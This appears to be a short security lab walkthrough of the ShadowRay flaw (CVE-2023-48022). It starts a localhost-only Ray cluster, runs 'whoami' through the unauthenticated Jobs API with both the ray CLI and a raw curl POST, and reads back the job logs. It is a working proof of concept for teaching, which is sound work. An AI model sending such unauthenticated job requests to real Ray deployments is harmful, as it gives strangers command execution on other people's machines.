# Lab 04: Ray with no login (ShadowRay, CVE-2023-48022)

```bash
# Turn on this lab's Python environment (Ray is installed here)
source .venv/bin/activate

# Start a Ray cluster on this laptop only
#   --head                        this machine is the main (head) node
#   --node-ip-address 127.0.0.1   every Ray port listens on localhost only
#   --dashboard-host 127.0.0.1    dashboard + Jobs API (port 8265) on localhost only
#   --disable-usage-stats         don't send usage stats to the Ray team
ray start --head --node-ip-address 127.0.0.1 --dashboard-host 127.0.0.1 --disable-usage-stats

# Ask Ray to run a command. No password.
#   --address http://127.0.0.1:8265   where the Jobs API is
#   -- whoami                         the command to run ("which user am I?")
ray job submit --address http://127.0.0.1:8265 -- whoami
# last lines:  warmearthling
#              Job 'raysubmit_...' succeeded

# Same thing with no Ray client. Just a web request.
#   -X POST                          "do something" (not just read)
#   .../api/jobs/                    Ray's "submit a job" address
#   -d '{"entrypoint": "whoami"}'    the data sent: the command to run
curl -X POST http://127.0.0.1:8265/api/jobs/ -d '{"entrypoint": "whoami"}'
# {"job_id": "raysubmit_vF9M4Fz5KUGbAMv8", ...}

# Read what the job printed. Use the job id from the line above.
curl http://127.0.0.1:8265/api/jobs/raysubmit_vF9M4Fz5KUGbAMv8/logs
# {"logs": "... warmearthling\n"}

# Shut Ray down
ray stop
```
